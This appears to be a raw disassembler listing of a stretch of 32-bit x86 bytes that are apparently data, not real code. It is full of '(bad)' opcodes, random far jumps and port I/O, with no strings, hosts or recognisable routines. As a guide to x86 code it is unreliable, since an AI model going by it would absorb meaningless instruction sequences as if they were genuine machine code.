  42cacb:	mov    edx,0x7891dc5a
  42cad0:	push   esp
  42cad1:	rcr    BYTE PTR [eax],cl
  42cad3:	addr16 int 0x3
  42cad6:	bound  edi,QWORD PTR [ebx+ebx*1+0x61474436]
  42cadd:	pop    es
  42cade:	scas   al,BYTE PTR es:[edi]
  42cadf:	enter  0x8598,0x9
  42cae3:	loopne 0x42cab4
  42cae5:	lds    eax,FWORD PTR [eax-0x11]
  42cae8:	js     0x42caff
  42caea:	sub    BYTE PTR [ebx+esi*1-0x73],dl
	...
  42cb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb57:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp+0x94b6ec0]
  42cb64:	nop
  42cb65:	dec    esi
  42cb66:	fild   WORD PTR [bx+di]
  42cb69:	add    BYTE PTR [eax],al
  42cb6b:	add    DWORD PTR [eax],eax
  42cb6d:	add    dh,ah
  42cb6f:	aas    
  42cb70:	cmp    BYTE PTR ds:0x738aa095,bl
  42cb76:	jae    0x42cbb9
  42cb78:	js     0x42cb33
  42cb7a:	inc    edi
  42cb7b:	test   edx,edx
  42cb7d:	push   ebx
  42cb7e:	(bad)  
  42cb7f:	push   ecx
  42cb80:	push   edi
  42cb81:	scas   al,BYTE PTR es:[edi]
  42cb82:	enter  0x641c,0x96
  42cb86:	loop   0x42cb46
  42cb88:	(bad)  
  42cb89:	mov    al,ds:0x455533f9
  42cb8e:	xor    DWORD PTR ds:0x7e9770d0,ecx
  42cb94:	(bad)  
  42cb95:	xchg   esi,eax
  42cb96:	pop    esp
  42cb97:	(bad)  
  42cb98:	scas   al,BYTE PTR es:[edi]
  42cb99:	xor    al,0x28
  42cb9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb9c:	pop    eax
  42cb9d:	sbb    ecx,DWORD PTR [eax+0x29]
  42cba0:	xchg   BYTE PTR ds:0xe5cd7597,al
  42cba6:	push   es
  42cba7:	cmp    al,0x13
  42cba9:	inc    ecx
  42cbaa:	cmp    al,0x82
  42cbac:	adc    al,0x25
  42cbae:	test   dl,dh
  42cbb0:	mov    ds:0xbac3383f,al
  42cbb5:	or     cl,dl
  42cbb7:	xchg   ebx,eax
  42cbb8:	out    dx,al
  42cbb9:	sub    eax,0x90b5b2b
  42cbbe:	or     BYTE PTR [edx],dh
  42cbc0:	xchg   esi,eax
  42cbc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cbc2:	fsubr  QWORD PTR [eax]
  42cbc4:	sub    esp,DWORD PTR [ebx+0x4af790f5]
  42cbca:	sbb    ch,al
  42cbcc:	inc    edi
  42cbcd:	push   edi
  42cbce:	jp     0x42cb52
  42cbd0:	mov    esp,0x50476b97
  42cbd5:	sub    eax,0x43032327
  42cbda:	setg   al
  42cbdd:	js     0x42cbbb
  42cbdf:	in     eax,0xb8
  42cbe1:	ror    BYTE PTR [edx],0xdb
  42cbe4:	dec    eax
  42cbe5:	mov    ch,0x2d
  42cbe7:	mov    cl,BYTE PTR [ebx-0x3b]
  42cbea:	loope  0x42cbb2
  42cbec:	lock jp 0x42cbf2
  42cbef:	repz dec ebx
  42cbf1:	mov    DWORD PTR [esp+esi*8+0x16],eax
  42cbf5:	in     al,0xde
  42cbf7:	cmp    bl,BYTE PTR [edi-0x3b6622be]
  42cbfd:	in     al,0x2a
  42cbff:	stos   DWORD PTR es:[edi],eax
  42cc00:	push   cs
  42cc01:	repz xor esi,0xffffffc8
  42cc05:	xor    ebx,DWORD PTR [esi]
  42cc07:	mov    WORD PTR [edx+ebx*8],cs
  42cc0a:	mov    ebx,DWORD PTR ds:0xf519621c
  42cc10:	iret   
  42cc11:	jno    0x42cbad
  42cc13:	cmp    al,0xa0
  42cc15:	add    DWORD PTR [eax],0x95b3b39e
  42cc1b:	push   esp
  42cc1c:	(bad)  
  42cc1d:	in     al,0x7e
  42cc1f:	pop    edx
  42cc20:	jecxz  0x42cc50
  42cc22:	inc    esp
  42cc23:	add    al,0x8b
  42cc25:	push   cs
  42cc26:	stos   BYTE PTR es:[edi],al
  42cc27:	scas   eax,DWORD PTR es:[edi]
  42cc28:	pop    ecx
  42cc29:	cmc    
  42cc2a:	sbb    eax,0xe7d43bf3
  42cc2f:	js     0x42cc7f
  42cc31:	ins    DWORD PTR es:[edi],dx
  42cc32:	repz pop ds
  42cc34:	aam    0x2f
  42cc36:	mov    esi,?
  42cc38:	or     al,0xb7
  42cc3a:	xlat   BYTE PTR ds:[ebx]
  42cc3b:	loopne 0x42cc6c
  42cc3d:	cmp    edi,ebx
  42cc3f:	jg     0x42cc4a
  42cc41:	mov    al,ds:0xefa5254f
  42cc46:	xchg   esi,eax
  42cc47:	and    DWORD PTR [ebx+0x7d],esp
  42cc4a:	pop    ss
  42cc4b:	or     eax,0xf63def22
  42cc50:	stos   BYTE PTR es:[edi],al
  42cc51:	test   BYTE PTR [ebx+0x65],0x64
  42cc55:	push   ecx
  42cc56:	lods   eax,DWORD PTR ds:[esi]
  42cc57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc58:	dec    edx
  42cc59:	shr    edx,0xf9
  42cc5c:	into   
  42cc5d:	ss pushf 
  42cc5f:	jno    0x42cc5f
  42cc61:	es and ebp,0x66
  42cc65:	addr16 call 0x5c24:0xe36d2827
  42cc6d:	fild   DWORD PTR [eax]
	...
  42ccd3:	add    BYTE PTR [eax],al
  42ccd5:	add    BYTE PTR [edi+0x2],bh
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x4e41b077
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    cl,bh
  42ccef:	jle    0x42ccf2
  42ccf1:	push   ebx
  42ccf2:	imul   DWORD PTR [ecx-0x66]
  42ccf5:	rol    DWORD PTR [eax],0x44
  42ccf8:	or     eax,0x7db7707e
  42ccfd:	xchg   ecx,eax
  42ccfe:	lods   al,BYTE PTR ds:[esi]
  42ccff:	sbb    BYTE PTR [ecx-0x5dae6ae5],0x22
  42cd06:	dec    esp
  42cd07:	clc    
  42cd08:	add    DWORD PTR [eax],edi
  42cd0a:	sbb    eax,0x38a43d5f
  42cd0f:	js     0x42cccb
  42cd11:	add    BYTE PTR [edx+esi*2],dl
  42cd14:	jns    0x42cccd
  42cd16:	cmp    al,0x90
  42cd18:	inc    esi
  42cd19:	sbb    BYTE PTR [ebp+0x3c],bl
  42cd1c:	xor    al,0xe9
  42cd1e:	mov    BYTE PTR [ebp+eiz*2-0x47],bh
  42cd22:	sub    al,BYTE PTR [eax]
  42cd24:	out    0xee,al
  42cd26:	and    edi,0x7adac20b
  42cd2c:	clc    
  42cd2d:	out    dx,eax
  42cd2e:	cmc    
  42cd2f:	aad    0x9c
  42cd31:	inc    esp
  42cd32:	push   edi
  42cd33:	out    0x25,al
  42cd35:	std    
  42cd36:	test   eax,0x9b546203
  42cd3b:	mov    WORD PTR [esi-0x618e5246],es
  42cd41:	test   BYTE PTR [edx],0x21
  42cd44:	and    DWORD PTR [ebp-0x439edb27],eax
  42cd4a:	dec    esp
  42cd4b:	mov    cl,0xe5
  42cd4d:	jp     0x42cd3a
  42cd4f:	dec    esp
  42cd50:	add    BYTE PTR [ebx-0x163a1e9c],0xc8
  42cd57:	inc    eax
  42cd58:	fscale 
  42cd5a:	test   al,0x4b
  42cd5c:	repnz adc ch,BYTE PTR [esi]
  42cd5f:	out    dx,eax
  42cd60:	pop    eax
  42cd61:	inc    DWORD PTR [ebx]
  42cd63:	xor    DWORD PTR [ebx-0x34],eax
  42cd66:	or     edi,DWORD PTR [eax]
  42cd68:	pop    edi
  42cd69:	mov    BYTE PTR [ebp-0x5256bea4],bh
  42cd6f:	push   esi
  42cd70:	add    ecx,DWORD PTR [ebx-0x75]
  42cd73:	out    dx,al
  42cd74:	aam    0x7e
  42cd76:	popa   
  42cd77:	int    0xa0
  42cd79:	mov    al,ds:0x4c454c9d
  42cd7e:	pop    ss
  42cd7f:	int    0x76
  42cd81:	xchg   esp,eax
  42cd82:	add    cl,bl
  42cd84:	xor    cl,BYTE PTR [ecx+0x5c]
  42cd87:	sbb    bl,BYTE PTR [ecx]
  42cd89:	mov    ebx,0x7d35b142
  42cd8e:	inc    eax
  42cd8f:	xor    dh,BYTE PTR [esi]
  42cd91:	dec    edi
  42cd92:	sti    
  42cd93:	loope  0x42cd29
  42cd95:	push   ebx
  42cd96:	xchg   ebx,eax
  42cd97:	adc    al,0xe6
  42cd9a:	cdq    
  42cd9b:	pop    ecx
  42cd9c:	fist   WORD PTR [ebp-0x5c]
  42cd9f:	jmp    0xc82b:0x8c818f45
  42cda6:	xchg   esp,eax
  42cda7:	and    eax,0xf2bf7218
  42cdac:	aam    0x1e
  42cdae:	push   eax
  42cdaf:	test   eax,0xff98c26f
  42cdb4:	sub    DWORD PTR [edx-0x702af3cf],0xffffffd2
  42cdbb:	inc    edi
  42cdbc:	fwait
  42cdbd:	adc    BYTE PTR [esi-0x4704bf8f],0x9f
  42cdc4:	out    0xa2,al
  42cdc6:	sub    al,0xa7
  42cdc8:	inc    ebp
  42cdc9:	jae    0x42cd4f
  42cdcb:	sbb    eax,0xb39adc6c
  42cdd0:	das    
  42cdd1:	sbb    BYTE PTR [edx+ebx*8-0x35],al
  42cdd5:	mov    ah,al
  42cdd7:	pushf  
  42cdd8:	ins    BYTE PTR es:[edi],dx
  42cdd9:	sbb    ecx,DWORD PTR [eax+0x14]
  42cddc:	xor    al,0xb5
  42cdde:	mov    ah,0xd3
  42cde0:	and    al,0xe0
  42cde2:	fcmovnu st,st(0)
  42cde4:	xchg   ecx,eax
  42cde5:	add    BYTE PTR [edx+0x46],ch
  42cde8:	or     eax,0x2d700ff6
  42cded:	test   BYTE PTR [eax],al
	...
  42ce53:	add    BYTE PTR [eax],al
  42ce55:	add    BYTE PTR [ecx],bl
  42ce57:	mov    eax,ds:0xdffe87fe
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0x3f
  42ce63:	mov    ds:0xe1677ad4,al
  42ce68:	add    DWORD PTR [eax],eax
  42ce6a:	add    BYTE PTR [ecx],al
  42ce6c:	add    BYTE PTR [eax],al
  42ce6e:	stos   BYTE PTR es:[edi],al
  42ce6f:	test   DWORD PTR [esi],0x6634afc2
  42ce75:	xlat   BYTE PTR ds:[ebx]
  42ce76:	sbb    eax,0x77b1eb7b
  42ce7b:	imul   esi,DWORD PTR [ebx],0x24
  42ce7e:	lods   al,BYTE PTR ds:[esi]
  42ce7f:	jle    0x42ce59
  42ce81:	mov    edi,0xabf6cfac
  42ce86:	pop    esp
  42ce87:	es push ebp
  42ce89:	adc    eax,0xea796e71
  42ce8e:	(bad)  
  42ce8f:	push   esp
  42ce90:	popa   
  42ce91:	div    BYTE PTR [edx]
  42ce93:	add    eax,0x42405911
  42ce98:	cmp    eax,0xf34a6d50
  42ce9d:	jmp    0x8621fba
  42cea2:	cld    
  42cea3:	(bad)  
  42cea6:	pop    edi
  42cea7:	out    dx,al
  42cea8:	push   ebp
  42cea9:	add    DWORD PTR [esi+0x2747fd02],0xa0d2f5ad
  42ceb3:	mov    eax,0x1d333d53
  42ceb8:	mov    esi,0x5b4a9969
  42cebd:	dec    ebx
  42cebe:	jno    0x42cee9
  42cec0:	fdiv   st(3),st
  42cec2:	sub    eax,DWORD PTR ds:0xa855e709
  42cec8:	mov    al,BYTE PTR [edx-0x11]
  42cecb:	scas   al,BYTE PTR es:[edi]
  42cecc:	push   esp
  42cecd:	mov    DWORD PTR [eax],0xd4650f63
  42ced3:	inc    edi
  42ced4:	shl    DWORD PTR [esi+0x4b],cl
  42ced7:	(bad)  
  42ced8:	jmp    0xde7dab89
  42cedd:	nop
  42cede:	stc    
  42cedf:	call   0x76754ccc
  42cee4:	mov    cl,0x86
  42cee6:	sbb    edi,DWORD PTR [ecx-0x339bb6cd]
  42ceec:	test   al,0x57
  42ceee:	jg     0x42cf6b
  42cef0:	bound  ebp,QWORD PTR [ebx]
  42cef2:	jle    0x42ced3
  42cef4:	cmp    ebx,DWORD PTR [ebx+0x36]
  42cef7:	or     cl,BYTE PTR [edx+0x7f]
  42cefa:	test   al,0x96
  42cefc:	fdivr  st(5),st
  42cefe:	mov    eax,0x6353cb5
  42cf03:	push   edx
  42cf04:	xchg   ebx,eax
  42cf05:	imul   edi,DWORD PTR [ebp+0x3b5d228],0xffffffe7
  42cf0c:	jg     0x42cf29
  42cf0e:	push   ds
  42cf0f:	mov    bh,BYTE PTR [ebx+0x59]
  42cf12:	sub    ecx,ebp
  42cf14:	shl    BYTE PTR [ecx-0x6a],1
  42cf17:	adc    edx,DWORD PTR [ebp-0x3d]
  42cf1a:	in     eax,0x65
  42cf1c:	mov    eax,ds:0x861389ee
  42cf21:	clc    
  42cf22:	inc    ebx
  42cf23:	xchg   ebx,eax
  42cf24:	push   es
  42cf25:	outs   dx,DWORD PTR ds:[esi]
  42cf26:	mov    eax,DWORD PTR [eax+0x15]
  42cf29:	mov    ebx,edx
  42cf2b:	hlt    
  42cf2c:	leave  
  42cf2d:	xor    eax,0x805d74fe
  42cf32:	pop    ds
  42cf33:	pop    ebx
  42cf34:	call   0xb53e:0x420b9efa
  42cf3b:	or     BYTE PTR [edi],dh
  42cf3d:	cmp    ebx,edi
  42cf3f:	fdiv   QWORD PTR [edi+edx*1]
  42cf42:	retw   0x9635
  42cf46:	xlat   BYTE PTR ds:[ebx]
  42cf47:	mov    BYTE PTR [edi-0x65],0x9e
  42cf4b:	xchg   ebp,eax
  42cf4c:	or     esi,DWORD PTR ds:0x2cab4e7f
  42cf52:	les    edx,FWORD PTR [ecx-0x2a66deb8]
  42cf58:	call   0xd806:0x4840e2ce
  42cf5f:	sbb    ebx,DWORD PTR [edx+0xb]
  42cf62:	xchg   esp,eax
  42cf63:	sbb    al,0xe7
  42cf65:	dec    edi
  42cf66:	bound  ebp,QWORD PTR [edi+ebp*4]
  42cf69:	pop    esp
  42cf6a:	push   ds
  42cf6b:	inc    esp
  42cf6c:	mov    ebx,0x82
	...
  42cfd5:	add    BYTE PTR [ebx+0x3d],dh
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    esp,FWORD PTR [ecx+esi*4+0x53]
  42cfe5:	loope  0x42d04e
  42cfe7:	loop   0x42cfea
  42cfe9:	add    BYTE PTR [eax],al
  42cfeb:	add    DWORD PTR [eax],eax
  42cfed:	add    BYTE PTR [edx],dl
  42cfef:	cli    
  42cff0:	sub    edi,DWORD PTR [ebx]
  42cff2:	jle    0x42d04f
  42cff4:	inc    edi
  42cff5:	daa    
  42cff6:	mov    ch,BYTE PTR ds:0x7d0fa934
  42cffc:	or     esi,DWORD PTR [esi+0x581094e4]
  42d002:	outs   dx,DWORD PTR ds:[esi]
  42d003:	pop    ds
  42d004:	jb     0x42d03e
  42d006:	adc    edi,esi
  42d008:	jne    0x42cf93
  42d00a:	inc    ebx
  42d00b:	dec    DWORD PTR [esi-0x4581e527]
  42d011:	xor    eax,0x8f9649e9
  42d016:	fist   WORD PTR [eax-0x4a]
  42d019:	mov    ch,0x27
  42d01b:	in     eax,0xf
  42d01d:	cwde   
  42d01e:	sbb    eax,0x77e983fc
  42d023:	fidiv  WORD PTR [edi+0x3141bc94]
  42d029:	mov    eax,ds:0xcdbe614
  42d02e:	jne    0x42d0ac
  42d030:	jmp    0x42d024
  42d032:	test   al,0xfd
  42d034:	fadd   QWORD PTR [edi-0x3e]
  42d037:	mov    edi,0xb6d9391b
  42d03c:	sahf   
  42d03d:	xchg   esp,eax
  42d03e:	int3   
  42d03f:	push   0x2a
  42d041:	sbb    DWORD PTR [esi-0x51d44f9a],0xc8f88924
  42d04b:	xlat   BYTE PTR ds:[ebx]
  42d04c:	mov    al,ds:0x120ad6f7
  42d051:	scas   eax,DWORD PTR es:[edi]
  42d052:	ds mov eax,0xfe8a7a31
  42d058:	pop    ss
  42d059:	popa   
  42d05a:	xchg   edi,eax
  42d05b:	out    dx,eax
  42d05c:	jmp    0x42d021
  42d05e:	sub    edi,DWORD PTR [edx]
  42d060:	hlt    
  42d061:	and    ebx,DWORD PTR [ecx-0x7c]
  42d064:	push   ebp
  42d065:	add    bh,bl
  42d067:	cs in  eax,0x38
  42d06a:	sub    bh,BYTE PTR [edx-0x62101cab]
  42d070:	cli    
  42d071:	(bad)  
  42d072:	imul   eax,DWORD PTR [edi+0x62340e5a],0xb8893031
  42d07c:	int3   
  42d07d:	cmp    eax,0xbbe69529
  42d082:	lock mov bh,0x87
  42d085:	add    al,0x1f
  42d087:	mov    eax,0x54859fcb
  42d08c:	and    BYTE PTR ds:0x35100f60,bl
  42d092:	loopne 0x42d100
  42d094:	add    ebx,DWORD PTR [ebx+edx*2-0x598257ce]
  42d09b:	adc    eax,0x697baec3
  42d0a0:	mov    ebp,0xde71a1c2
  42d0a5:	fnstenv [ebp-0x34c99058]
  42d0ab:	push   eax
  42d0ac:	gs jno 0x42d0f0
  42d0af:	rcr    edi,1
  42d0b1:	or     al,bl
  42d0b3:	(bad)  
  42d0b4:	mov    ss,WORD PTR [eax+0x33fcff0f]
  42d0ba:	mov    DWORD PTR [ebx-0x4e],ebp
  42d0bd:	cld    
  42d0be:	shl    DWORD PTR [edi+eax*2-0x2e482568],cl
  42d0c5:	ret    
  42d0c6:	pop    esi
  42d0c7:	mov    DWORD PTR [ebx],0x83c56f8a
  42d0cd:	das    
  42d0ce:	mov    ecx,0xe1d376cb
  42d0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0d4:	mov    edi,0x96fea81a
  42d0d9:	push   ebp
  42d0da:	mov    bh,0x74
  42d0dc:	sbb    dh,BYTE PTR [ecx-0x4fc32fa6]
  42d0e2:	cwde   
  42d0e3:	fsubr  st(3),st
  42d0e5:	mov    esp,0x5404256e
  42d0ea:	pushf  
  42d0eb:	xchg   ebx,eax
  42d0ec:	or     eax,0xea
	...
  42d155:	add    BYTE PTR [eax+0x3a],dl
  42d158:	(bad)  
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    BYTE PTR [edx-0x11],ch
  42d164:	mov    ch,0xe9
  42d166:	jcxz   0x42d16a
  42d169:	add    BYTE PTR [eax],al
  42d16b:	add    DWORD PTR [eax],eax
  42d16d:	add    BYTE PTR ds:0x6c63fcec,dl
  42d173:	outs   dx,BYTE PTR ds:[esi]
  42d174:	ror    BYTE PTR [esi+0x7acb21],cl
  42d17a:	inc    edi
  42d17b:	jl     0x42d14b
  42d17d:	jg     0x42d175
  42d17f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d180:	out    dx,al
  42d181:	sub    edx,DWORD PTR ds:0xd74a9b55
  42d187:	rcl    BYTE PTR [esi],cl
  42d189:	rol    BYTE PTR [edx+0x6c],1
  42d18c:	popa   
  42d18d:	push   esp
  42d18e:	fwait
  42d18f:	(bad)  
  42d190:	push   eax
  42d191:	pop    es
  42d192:	scas   eax,DWORD PTR es:[edi]
  42d193:	mov    eax,0x2fe6e6c7
  42d198:	shl    DWORD PTR [eax+0x32],cl
  42d19b:	rcl    edx,1
  42d19d:	mov    ?,ebx
  42d19f:	retf   0x27c0
  42d1a2:	mov    esp,0x74071320
  42d1a7:	xchg   esp,eax
  42d1a8:	(bad)  
  42d1a9:	push   ebx
  42d1aa:	hlt    
  42d1ab:	das    
  42d1ac:	mov    eax,ds:0x98bb8990
  42d1b1:	ret    
  42d1b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1b3:	dec    edi
  42d1b4:	or     al,0x45
  42d1b6:	xor    al,0x49
  42d1b8:	pop    es
  42d1b9:	adc    BYTE PTR [eax-0x1e],dh
  42d1bc:	js     0x42d1a0
  42d1be:	xor    ebx,DWORD PTR [edx-0x15]
  42d1c1:	rol    DWORD PTR [esi],0xf7
  42d1c4:	pop    ebp
  42d1c5:	fst    DWORD PTR [edi]
  42d1c7:	push   0x4ac85cf4
  42d1cc:	add    cl,dl
  42d1ce:	sbb    al,0xa9
  42d1d0:	cmp    dh,cl
  42d1d2:	call   0xc455e8f7
  42d1d7:	push   ds
  42d1d8:	out    0xaa,eax
  42d1da:	jne    0x42d1e2
  42d1dc:	sbb    al,bh
  42d1de:	inc    esp
  42d1df:	sub    al,0xa
  42d1e1:	jns    0x42d1b8
  42d1e3:	add    al,cl
  42d1e5:	push   ss
  42d1e6:	push   ds
  42d1e7:	dec    edx
  42d1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d1e9:	outs   dx,DWORD PTR ds:[esi]
  42d1ea:	pop    edi
  42d1eb:	hlt    
  42d1ec:	retf   
  42d1ed:	fs mov edi,0x40fe2f3
  42d1f3:	pop    ds
  42d1f4:	cmc    
  42d1f5:	outs   dx,DWORD PTR ds:[esi]
  42d1f6:	pop    eax
  42d1f7:	sbb    bh,cl
  42d1f9:	lea    ebx,[ebx]
  42d1fb:	nop
  42d1fc:	sub    bh,al
  42d1fe:	loopne 0x42d1c2
  42d200:	mov    ds:0x3c7160c4,eax
  42d205:	mov    ecx,0x9c74143b
  42d20a:	in     eax,0xb1
  42d20c:	es into 
  42d20e:	ret    
  42d20f:	inc    eax
  42d210:	add    ebp,DWORD PTR [esi]
  42d212:	jnp    0x42d22d
  42d214:	push   ebx
  42d215:	mov    al,ds:0x23396945
  42d21a:	popf   
  42d21b:	sub    dh,BYTE PTR ds:0x681ceeb0
  42d221:	or     BYTE PTR [esi-0x450d513a],ch
  42d227:	push   edx
  42d228:	sbb    eax,0x6020428
  42d22d:	sbb    al,0xb7
  42d22f:	int    0x30
  42d231:	xchg   ebx,eax
  42d232:	lea    eax,[ecx-0x286ff507]
  42d238:	popf   
  42d239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d23a:	mov    ds,WORD PTR [ebp-0x7f636fa3]
  42d240:	push   ebx
  42d241:	(bad)  
  42d242:	mov    esp,0x4dd23209
  42d247:	pop    eax
  42d248:	lods   eax,DWORD PTR ds:[esi]
  42d249:	retf   0xae36
  42d24c:	inc    ecx
  42d24d:	add    eax,0x5160a90e
  42d252:	mov    esi,0x1a8f1a3c
  42d257:	(bad)  
  42d258:	addr16 cmp eax,edi
  42d25b:	loop   0x42d2b1
  42d25d:	retf   0x7771
  42d260:	mov    esi,0xac16dca
  42d265:	jmp    0x42d26a
  42d267:	adc    BYTE PTR [ecx+0x2d],bh
  42d26a:	popaw  
  42d26c:	sub    edi,DWORD PTR [edi]
	...
  42d2d6:	lea    ecx,[eax]
  42d2d8:	pop    ebp
  42d2d9:	jbe    0x42d2b8
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d340
  42d2e3:	shl    DWORD PTR [ebp+edx*8+0x67],1
  42d2e7:	in     al,0x1
  42d2e9:	add    BYTE PTR [eax],al
  42d2eb:	add    DWORD PTR [eax],eax
  42d2ed:	add    BYTE PTR [eax+0x34],bl
  42d2f0:	(bad)  
  42d2f1:	xchg   ebx,eax
  42d2f2:	adc    bl,BYTE PTR [esi+esi*1-0x5e]
  42d2f6:	or     ecx,DWORD PTR [edi]
  42d2f8:	fsubr  st,st(3)
  42d2fa:	fcmovnu st,st(1)
  42d2fc:	xor    edi,DWORD PTR [esi+0x4b]
  42d2ff:	add    esp,esp
  42d301:	dec    esp
  42d302:	mov    BYTE PTR [ebp-0x1e],cl
  42d305:	xchg   ebp,eax
  42d306:	add    edx,DWORD PTR [esi-0x266508b7]
  42d30c:	mov    ds:0x7fa06c71,eax
  42d311:	fs icebp 
  42d313:	pop    eax
  42d314:	rcr    DWORD PTR [eax+0x13db4359],1
  42d31a:	push   0xa10f0246
  42d31f:	inc    DWORD PTR [eax+0x6b32fd74]
  42d325:	dec    ah
  42d327:	popa   
  42d328:	cld    
  42d329:	repz pop es
  42d32b:	push   cs
  42d32c:	scas   al,BYTE PTR es:[edi]
  42d32d:	into   
  42d32e:	fild   DWORD PTR [eax]
  42d330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d331:	push   0x85e20d17
  42d336:	je     0x42d2e2
  42d338:	add    bl,BYTE PTR [edi]
  42d33a:	dec    esi
  42d33b:	test   ebp,0xd3e7f373
  42d341:	xchg   esi,eax
  42d342:	adc    edx,DWORD PTR [esi-0x19]
  42d345:	mov    bl,0xbb
  42d347:	mov    dh,0x69
  42d349:	in     al,0x6d
  42d34b:	push   ebp
  42d34c:	jb     0x42d2ee
  42d34e:	test   BYTE PTR [eax+0x2d],cl
  42d351:	adc    cl,BYTE PTR ds:0x90cba682
  42d357:	aad    0xc1
  42d359:	xor    DWORD PTR [ecx+eax*4-0x39],edi
  42d35d:	xor    BYTE PTR [eax],cl
  42d35f:	fistp  QWORD PTR [esi+0x3219ad8f]
  42d365:	(bad)  
  42d366:	fmul   st,st(7)
  42d368:	shl    DWORD PTR [eax+eax*4+0x30],cl
  42d36c:	imul   esp,DWORD PTR [eax-0x2b],0x1
  42d370:	out    0x70,eax
  42d372:	(bad)  
  42d373:	ins    DWORD PTR es:[edi],dx
  42d374:	jns    0x42d385
  42d376:	lds    ebp,FWORD PTR [ecx-0x64dae383]
  42d37c:	pop    ebx
  42d37d:	cmp    al,0xef
  42d37f:	pop    ss
  42d380:	lds    ecx,FWORD PTR [ebx+0x1fa49aa1]
  42d386:	fcom   DWORD PTR [ebp-0x40]
  42d389:	mov    al,ds:0xcc98d8b9
  42d38e:	or     DWORD PTR [edi],0x765cabc4
  42d394:	sub    esp,DWORD PTR [edx+0xd]
  42d397:	ins    BYTE PTR es:[edi],dx
  42d398:	push   esi
  42d399:	xchg   ebx,eax
  42d39a:	add    DWORD PTR [ecx],edi
  42d39c:	dec    esp
  42d39d:	jmp    0x192427ad
  42d3a2:	(bad)  [eax+0x8]
  42d3a5:	xor    eax,0xfa80b0e2
  42d3aa:	sub    eax,ebp
  42d3ac:	adc    al,BYTE PTR [edx-0xdb2e86f]
  42d3b2:	adc    eax,0x4be7a6f4
  42d3b7:	mov    cl,BYTE PTR [esi]
  42d3b9:	dec    ebp
  42d3ba:	cmc    
  42d3bb:	scas   al,BYTE PTR es:[edi]
  42d3bc:	data16 jp 0x42d362
  42d3bf:	push   0xffffffb4
  42d3c1:	mov    esi,0xaad92a1b
  42d3c6:	out    0xcf,eax
  42d3c8:	adc    dh,BYTE PTR ds:0x32686439
  42d3ce:	inc    edi
  42d3cf:	sbb    esi,DWORD PTR [esi]
  42d3d1:	sbb    dh,bh
  42d3d3:	add    eax,DWORD PTR [ebx]
  42d3d5:	inc    edx
  42d3d6:	pop    esp
  42d3d7:	into   
  42d3d8:	in     al,dx
  42d3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3da:	pop    es
  42d3db:	ret    0x3a20
  42d3de:	sahf   
  42d3df:	inc    edx
  42d3e0:	scas   al,BYTE PTR es:[edi]
  42d3e1:	loope  0x42d388
  42d3e3:	mov    edx,DWORD PTR [edx+eiz*4]
  42d3e6:	cld    
  42d3e7:	shr    DWORD PTR [esi],0xd0
  42d3ea:	outs   dx,BYTE PTR ds:[esi]
  42d3eb:	int    0xba
  42d3ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42d456:	ror    esi,0x63
  42d459:	cdq    
  42d45a:	outs   dx,DWORD PTR ds:[esi]
  42d45b:	mov    ebp,0x9459defb
  42d460:	aaa    
  42d461:	pushf  
  42d462:	adc    bh,BYTE PTR [eax+ecx*8]
  42d465:	aas    
  42d466:	addr16 in eax,0x1
  42d469:	add    BYTE PTR [eax],al
  42d46b:	add    DWORD PTR [eax],eax
  42d46d:	add    BYTE PTR [ebp+0x11],al
  42d470:	pop    edi
  42d471:	sub    DWORD PTR [edi+0x6c2b9b22],edi
  42d477:	sbb    cl,BYTE PTR [ecx+0x2a64ba2b]
  42d47d:	push   ecx
  42d47e:	out    dx,eax
  42d47f:	pop    ds
  42d480:	mov    ah,al
  42d482:	cld    
  42d483:	sbb    eax,0x8145c150
  42d488:	popf   
  42d489:	sti    
  42d48a:	call   0x145d:0x4e7b6940
  42d491:	outs   dx,DWORD PTR ds:[esi]
  42d492:	iret   
  42d493:	push   0x1c385cb6
  42d498:	dec    edx
  42d499:	fstp   TBYTE PTR [ebp+0xbb3b35a]
  42d49f:	or     al,0xf
  42d4a1:	outs   dx,BYTE PTR ds:[esi]
  42d4a2:	add    BYTE PTR [edx+eiz*8+0x61d4bb3a],bh
  42d4a9:	ja     0x42d495
  42d4ab:	ss ins BYTE PTR es:[edi],dx
  42d4ad:	mov    al,0xd6
  42d4af:	jb     0x42d4fa
  42d4b1:	cmp    DWORD PTR [edx+0x680849e9],ebx
  42d4b7:	popf   
  42d4b8:	adc    eax,0x9613b2c9
  42d4bd:	and    eax,0xdf5f7105
  42d4c2:	dec    esi
  42d4c3:	pop    ss
  42d4c4:	inc    eax
  42d4c5:	cwde   
  42d4c6:	(bad)  
  42d4c7:	and    ch,cl
  42d4c9:	mov    edi,0x94d010e8
  42d4ce:	into   
  42d4cf:	push   edx
  42d4d0:	test   al,0x4b
